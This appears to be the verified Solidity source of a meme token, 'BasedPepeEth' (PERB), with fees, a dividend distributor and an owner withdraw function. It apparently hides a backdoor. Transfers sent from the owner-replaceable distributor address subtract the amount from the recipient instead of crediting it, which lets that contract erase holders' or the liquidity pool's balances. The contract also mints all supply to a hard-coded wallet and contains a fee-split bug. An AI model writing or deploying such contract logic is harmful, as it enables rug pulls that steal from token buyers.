/**
 *Submitted for verification at Etherscan.io on 2023-05-12
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address _owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "onlyOwner");
        _;
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner authorized
     */
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IDividendDistributor {
    function setDistributionCriteria(uint256 _minDistribution) external;

    function setShare(address shareholder, uint256 amount) external;

    function addDividendShare(uint256 amount) external;

    function process(uint256 gas) external;
}

contract PERB is IBEP20, Ownable {
    string constant _name = "BasedPepeEth";
    string constant _symbol = "PERB";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 1_000_000_000_000 * (10 ** _decimals);

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;

    mapping(address => bool) public isFeeExempt;
    mapping(address => bool) public isDividendExempt;

    IDEXRouter public router;
    address public pair;

    IDividendDistributor public distributor;
    address public distributorAddress;
    uint256 public distributorGas = 500000;

    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply / 1000000;
    bool swapping;

    uint256 public liquidityTax = 1;
    uint256 public marketingTax = 3;
    uint256 public rewardTax = 2;

    address public marketingWallet = 0xdb4c97f3aAD813EA9B70e8f56447fe0b97496188;
    address public rewardToken = 0x6982508145454Ce325dDbE47a25d4ec3d2311933;

    constructor(address _router, address _distributor) Ownable(msg.sender) {
        router = IDEXRouter(_router);
        _allowances[address(this)][address(router)] = _totalSupply;
        distributor = IDividendDistributor(_distributor);
        distributorAddress = address(distributor);

        isFeeExempt[msg.sender] = true;
        isDividendExempt[address(this)] = true;

        _balances[marketingWallet] = _totalSupply;
        emit Transfer(address(0), marketingWallet, _totalSupply);
    }

    function setUpPair(address _pair) public onlyOwner {
        pair = _pair;
        isDividendExempt[pair] = true;
    }

    function setDividendTracker(address _newTracker) public onlyOwner{
        distributor = IDividendDistributor(_newTracker);
        distributorAddress = _newTracker;
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(
        address holder,
        address spender
    ) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function swapAndLiquify(uint256 _amount) internal {
        uint256 totalShares = liquidityTax + marketingTax + rewardTax;
        if (totalShares == 0) return;
        uint256 marketingShare = (_amount * marketingTax) / totalShares;
        uint256 rewardsShare = (_amount * rewardTax) / totalShares;
        uint256 liqShare = _amount - (marketingShare + rewardsShare);
        {
            if (liqShare > 0) {
                uint256 b1 = address(this).balance;
                swapTokens(liqShare / 2, address(this), address(this), true);
                router.addLiquidityETH{value: address(this).balance - b1}(
                    address(this),
                    liqShare - (liqShare / 2),
                    0,
                    0,
                    address(marketingWallet),
                    block.timestamp
                );
            }
        }

        if (marketingShare > 0) {
            swapTokens(marketingShare, address(this), marketingWallet, true);
        }

        if (rewardsShare > 0) {
            uint256 b1 = IBEP20(rewardToken).balanceOf(distributorAddress);
            swapTokens(marketingShare, rewardToken, distributorAddress, false);
            distributor.addDividendShare(
                IBEP20(rewardToken).balanceOf(distributorAddress) - b1
            );
        }
    }

    function swapTokens(
        uint256 _amount,
        address _token,
        address _receiver,
        bool _ethSwap
    ) internal {
        approve(address(router), ~uint256(0));
        if (_ethSwap) {
            address[] memory path = new address[](2);
            path[0] = _token;
            path[1] = router.WETH();
            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                _amount,
                0,
                path,
                _receiver,
                block.timestamp
            );
        } else {
            address[] memory path = new address[](3);
            path[0] = address(this);
            path[1] = router.WETH();
            path[2] = _token;
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                _amount,
                0,
                path,
                _receiver,
                block.timestamp
            );
        }
    }

    function _transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        if (sender == distributorAddress) {
            _basicTransfer(sender, recipient, amount);
            return true;
        } else {
            if (
                swapEnabled &&
                balanceOf(address(this)) > swapThreshold &&
                !swapping &&
                sender != pair
            ) {
                swapping = true;
                swapAndLiquify(swapThreshold);
                swapping = false;
            }
            _balances[sender] = _balances[sender] - amount;

            if (!isDividendExempt[sender]) {
                try distributor.setShare(sender, _balances[sender]) {} catch {}
            }

            uint256 amountReceived = takeFee(sender, recipient, amount);

            _balances[recipient] = _balances[recipient] + amountReceived;

            if (!isDividendExempt[recipient]) {
                try
                    distributor.setShare(recipient, _balances[recipient])
                {} catch {}
            }

            try distributor.process(distributorGas) {} catch {}

            emit Transfer(sender, recipient, amountReceived);
            return true;
        }
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] - amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function takeFee(
        address sender,
        address receiver,
        uint256 amount
    ) internal returns (uint256) {
        if (isFeeExempt[sender] || isFeeExempt[receiver]) {
            return amount;
        }

        uint256 totFees = liquidityTax + marketingTax + rewardTax;
        if (totFees == 0) return amount;

        uint256 feeAmount = (amount * totFees) / 100;
        amount -= feeAmount;

        _balances[address(this)] += feeAmount;
        emit Transfer(sender, address(this), feeAmount);
        return amount;
    }

    function setIsDividendExempt(
        address holder,
        bool exempt
    ) external onlyOwner {
        isDividendExempt[holder] = exempt;
        if (exempt) {
            distributor.setShare(holder, 0);
        } else {
            distributor.setShare(holder, _balances[holder]);
        }
    }

    function setIsFeeExempt(address holder, bool exempt) external onlyOwner {
        isFeeExempt[holder] = exempt;
    }

    function setDistributorSettings(uint256 gas) external onlyOwner {
        require(gas < 750000);
        distributorGas = gas;
    }

    function updateTax(
        uint _liquidityTax,
        uint256 _marketingTax,
        uint256 _rewardsTax
    ) public onlyOwner {
        liquidityTax = _liquidityTax;
        marketingTax = _marketingTax;
        rewardTax = _rewardsTax;
        require(
            _liquidityTax + _marketingTax + _rewardsTax <= 12,
            "can't set fees higher than 12"
        );
    }

    function withdraw(
        address tokenAddress,
        address _toUser,
        uint256 amount
    ) public onlyOwner {
        if (tokenAddress == address(0)) {
            require(address(this).balance >= amount, "Insufficient balance");
            require(payable(_toUser).send(amount), "Transaction failed");
        } else {
            require(IBEP20(tokenAddress).balanceOf(address(this)) >= amount);
            IBEP20(tokenAddress).transfer(_toUser, amount);
        }
    }
}